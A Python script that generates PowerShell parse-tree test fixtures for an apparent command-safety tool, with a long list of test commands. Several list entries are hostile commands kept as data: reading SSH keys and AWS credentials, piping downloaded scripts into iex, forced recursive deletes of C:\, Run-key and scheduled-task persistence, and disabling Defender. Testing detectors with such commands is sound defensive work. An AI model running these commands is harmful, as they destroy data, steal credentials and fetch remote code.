r"""Generate the PowerShell AST fixtures in tests/fixtures/ps_ast/ with the REAL helper.

Runs every command of COMMANDS through ``boundkeep.normalize.psparse`` (a real PowerShell child
running ``pshelper.ps1``) and stores the helper's reply, one JSON file per command:

* ``tests/fixtures/ps_ast/<slug>-<sha256 prefix>.json``: the reply dict exactly as ``helper_parse``
  returns it (the request ``id`` is dropped because it is random; ``commands[*].pos`` are already
  Python string offsets);
* ``tests/fixtures/ps_ast/index.json``: ``{exact command text: file name}``, sorted by command.

The slug is derived from the command text, so a file name never depends on the order of COMMANDS
and a regeneration produces a minimal diff. Existing files that are no longer listed are left alone
(other tests may add hand-written fixtures here). Windows only (needs PowerShell).

Usage: python scripts/gen_ps_fixtures.py [--out DIR] [--check]
  --check  regenerate in memory and fail if any stored fixture differs (a PowerShell update changes
           parse-error wording, for instance); writes nothing.
"""

import argparse
import hashlib
import json
import os
import re
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))

from boundkeep.normalize import psparse  # noqa: E402

DEFAULT_OUT = os.path.join(ROOT, "tests", "fixtures", "ps_ast")

COMMANDS: list[str] = [
    # --- the basics ---------------------------------------------------------------------------
    "Get-ChildItem",
    "ls -r",
    "rm -rf x",
    r"Remove-Item -Recurse -Force C:\x",
    "dir",
    "gci -Recurse -Filter *.py",
    "Get-ChildItem -Path . -Recurse -Force",
    "Get-ChildItem -Pa src",
    "ls -Path:src -Fo",
    "Get-Content README.md",
    "cat README.md",
    "gc -TotalCount 5 .\\a.txt",
    "type a.txt, b.txt",
    "Select-String -Path *.py -Pattern 'TODO'",
    "sls TODO src\\*.py",
    "Test-Path C:\\Windows",
    "Get-Location",
    "cd ..",
    "Set-Location -LiteralPath 'C:\\Program Files'",
    "echo hello",
    "Write-Output 'single quoted'",
    'Write-Output "double quoted"',
    "Write-Host done",
    # --- dangerous things the rules care about -------------------------------------------------
    "Remove-Item -Recurse -Force C:\\",
    "Remove-Item -Recurse -Force -Path C:\\Users\\bob\\proj",
    "Remove-Item -Rec -Fo ./build",
    "rm -r -fo build",
    "del /s /q C:\\x",
    "ri -Force:$true x.txt",
    r"Get-Content ~\.ssh\id_rsa",
    "Get-Content $env:USERPROFILE\\.ssh\\id_rsa",
    'Get-Content "$HOME\\.aws\\credentials"',
    "Get-Content -LiteralPath C:\\Users\\bob\\.ssh\\id_rsa",
    "curl https://github.com.evil.com/x",
    "curl.exe -sSL https://example.com/install.sh -o install.sh",
    "wget https://example.com/a.zip",
    "iwr -Uri https://example.com/a.ps1 -OutFile a.ps1",
    "Invoke-WebRequest https://example.com -UseBasicParsing",
    "Invoke-RestMethod -Uri https://api.example.com/v1 -Method Post -Body $body",
    "irm https://example.com/x | iex",
    "Set-Content $env:USERPROFILE\\.bashrc x",
    "'x' > ~\\.bashrc",
    "$a >> $env:TEMP\\f.txt",
    "(Get-Content a) > b",
    'Add-Content -Path "$env:USERPROFILE\\Documents\\WindowsPowerShell\\profile.ps1" -Value "calc"',
    "Out-File -FilePath C:\\x\\y.txt -InputObject hi",
    "Copy-Item .\\secret.txt \\\\server\\share\\",
    "Move-Item a.txt C:\\Temp\\",
    "git push --force origin main",
    "git -C C:\\repo status",
    "npm install left-pad",
    "pip install requests",
    "docker run --rm -v C:\\x:/x alpine ls",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d calc.exe",
    "schtasks /create /tn x /tr calc.exe /sc onlogon",
    "Register-ScheduledTask -TaskName x -Action $a -Trigger $t",
    "Set-ExecutionPolicy Bypass -Scope CurrentUser",
    "Set-MpPreference -ExclusionPath C:\\",
    # --- dynamic execution and obfuscation ------------------------------------------------------
    "iex 'whoami'",
    "Invoke-Expression $cmd",
    "& ('i'+'ex') 'whoami'",
    "& $x",
    "& 'C:\\Program Files\\Git\\bin\\git.exe' status",
    "&'git' log",
    ". .\\setup.ps1",
    ". $profile",
    "& .\\run.cmd",
    ".\\build.bat",
    "powershell -EncodedCommand SQBFAFgAIAAnAHcAaABvAGEAbQBpACcA",
    "powershell -enc SQBFAFgA",
    'pwsh -NoProfile -Command "Remove-Item x"',
    "pwsh -c 'ls'",
    "cmd /c del /q x",
    "Start-Process notepad.exe",
    "saps calc -Verb RunAs",
    "start https://example.com",
    "Invoke-Command -ComputerName srv -ScriptBlock { whoami }",
    "icm -ScriptBlock { ls }",
    "Add-Type -TypeDefinition 'public class X {}'",
    "New-Object -ComObject WScript.Shell",
    "[System.IO.File]::Delete('C:\\x')",
    "[scriptblock]::Create('whoami').Invoke()",
    "('whoami')",
    "(Get-Content x) -join ','",
    "$x = Get-Content a.txt; Remove-Item $x",
    "$env:PATH = 'C:\\evil;' + $env:PATH",
    "Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process",
    "Get-ChildItem | ForEach-Object { Remove-Item $_.FullName }",
    "ls | % { rm $_ }",
    "gci | ? { $_.Length -gt 1mb } | select Name, Length",
    "iex (New-Object Net.WebClient).DownloadString('http://x/a')",
    "& { Remove-Item x }",
    "Write-Output $(Get-Date)",
    'Write-Output "now: $(Get-Date)"',
    'Write-Output "home: $env:USERPROFILE and $HOME\\x"',
    "Remove-Item $(Join-Path $env:TEMP 'x')",
    # --- syntax variety -------------------------------------------------------------------------
    "ls; pwd",
    "ls | Select-Object -First 3",
    "Get-Content a.txt | Out-File b.txt",
    "ls > out.txt",
    "ls >> out.txt",
    "ls 2> err.txt",
    "ls *> all.txt",
    "ls 2>&1",
    "ls > $null",
    "git status 2>&1 | Out-String",
    "Get-Content < in.txt",
    "ls `\n  -Force",
    'Write-Output `"quoted`"',
    "Write-Output 'it''s'",
    "Remove-Item C:\\`$weird",
    "Get-Item 'a b.txt'",
    "Get-Item a` b.txt",
    "@args",
    "Get-ChildItem @params",
    'Get-ChildItem -Path @("a", "b")',
    "Get-ChildItem a,b,c",
    "Copy-Item -Path a,b -Destination c",
    "Get-Date -Format yyyy-MM-dd",
    "Start-Sleep 5",
    "Select-Object -First 5",
    "foo -bar:baz",
    "foo -bar:$true",
    "foo -bar: baz",
    "foo --% %PATH% $x",
    "foo -- -x",
    "foo -5 -1.5 0x10",
    "foo 1,2,3",
    "foo $true $null",
    "foo ${env:USERPROFILE}",
    "foo $global:x $script:y $using:z",
    "foo $x.y $x[0] $x::y",
    "foo -Path:$env:TEMP",
    "foo <#comment#> bar # trailing",
    "foo\tbar",
    "# only a comment",
    "",
    "   ",
    # --- provider paths -------------------------------------------------------------------------
    "Get-ItemProperty HKLM:\\Software\\Microsoft",
    "Set-ItemProperty -Path HKCU:\\Software\\x -Name y -Value 1",
    "New-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1",
    "Get-ChildItem Env:",
    "Get-Item Env:PATH",
    "Set-Item Env:FOO bar",
    "Get-ChildItem Cert:\\CurrentUser\\My",
    "Get-Content Function:\\prompt",
    "Get-Content Microsoft.PowerShell.Core\\FileSystem::C:\\x\\y.txt",
    "Get-Content \\\\?\\C:\\x\\y.txt",
    # --- compound statements and parse errors ---------------------------------------------------
    "if ($true) { Remove-Item x }",
    "foreach ($f in Get-ChildItem) { Remove-Item $f }",
    "while ($true) { Start-Sleep 1 }",
    "try { rm x } catch { echo $_ } finally { echo done }",
    "switch ($x) { 1 { 'a' } default { 'b' } }",
    "function f { Remove-Item x }; f",
    "$x = 5",
    "$x = Get-Content a.txt",
    "$a, $b = 1, 2",
    "[int]$x = 5",
    "for ($i = 0; $i -lt 3; $i++) { echo $i }",
    "do { echo x } while ($false)",
    "trap { continue }; rm x",
    "using namespace System.IO",
    "return",
    "exit 1",
    "throw 'x'",
    "ls && pwd",
    "ls || pwd",
    "test -and ls",
    "ls ; ; pwd",
    "Get-Content (",
    "echo 'unterminated",
    'echo "unterminated',
    "Get-ChildItem }",
    "rm -rf x && echo done",
    "ls & pwd",
    "echo hi |",
    "$x ?? 'y'",
    "$x ? 1 : 2",
    # --- here-strings ---------------------------------------------------------------------------
    "@'\nline1\nline2\n'@",
    '@"\nhello $env:USERNAME\n"@',
    "Set-Content -Path a.txt -Value @'\nraw $text\n'@",
    'Write-Output @"\nuser: $env:USERNAME\n"@',
    "Add-Content x.ps1 @'\nRemove-Item -Recurse -Force C:\\\n'@",
    # --- non-ASCII ------------------------------------------------------------------------------
    'Write-Output "你好 ✓"',
    "Get-Content C:\\用户\\文档\\说明.txt",
    "Set-Content -Path 报告.txt -Value 'done ✓'",
    "ls ~\\桌面",
    "Write-Output '😀 emoji'",
    "Remove-Item 'C:\\x\\😀.txt'",
    "echo ｒｍ ｘ",  # noqa: RUF001
    "Get-Content ＣＯＮ",  # noqa: RUF001
    # --- odd characters ------------------------------------------------------------------------
    "echo a\x00b",
    "echo \u2018smart\u2019 \u201cquotes\u201d",
    "Remove-Item \u2013Recurse \u2013Force C:\\x",
]


def slug(text: str) -> str:
    base = re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")[:40].strip("-") or "empty"
    return base


def file_name(text: str) -> str:
    digest = hashlib.sha256(text.encode("utf-8", "surrogatepass")).hexdigest()[:8]
    return f"{slug(text)}-{digest}.json"


def fixture_text(reply: dict) -> str:
    body = {k: v for k, v in reply.items() if k != "id"}
    return json.dumps(body, ensure_ascii=True, indent=1) + "\n"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--out", default=DEFAULT_OUT)
    parser.add_argument("--check", action="store_true")
    args = parser.parse_args()

    if len(set(COMMANDS)) != len(COMMANDS):
        dup = sorted({c for c in COMMANDS if COMMANDS.count(c) > 1})
        print("duplicate commands:", dup)
        return 2
    helper = psparse.PsHelper(startup_timeout_s=60)
    if not helper.warm_up(wait_s=60):
        print("no working PowerShell helper:", helper.status())
        return 2
    print("helper:", helper.status()["version"], helper.status()["mode"])
    index: dict[str, str] = {}
    outputs: dict[str, str] = {}
    failed = 0
    for command in COMMANDS:
        reply, gray = helper.request(command, budget_s=30)
        if reply is None:
            print("FAILED", repr(command), gray)
            failed += 1
            continue
        name = file_name(command)
        index[command] = name
        outputs[name] = fixture_text(reply)
    helper.shutdown()
    if failed:
        return 1
    index_text = json.dumps(dict(sorted(index.items())), ensure_ascii=True, indent=1) + "\n"
    if args.check:
        stale = [
            name
            for name, text in outputs.items()
            if not os.path.exists(os.path.join(args.out, name))
            or open(os.path.join(args.out, name), encoding="utf-8", newline="").read() != text
        ]
        print(f"{len(outputs)} fixtures, {len(stale)} differ: {stale[:10]}")
        return 1 if stale else 0
    os.makedirs(args.out, exist_ok=True)
    for name, text in outputs.items():
        with open(os.path.join(args.out, name), "w", encoding="utf-8", newline="\n") as handle:
            handle.write(text)
    with open(os.path.join(args.out, "index.json"), "w", encoding="utf-8", newline="\n") as handle:
        handle.write(index_text)
    print(f"wrote {len(outputs)} fixtures and index.json to {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
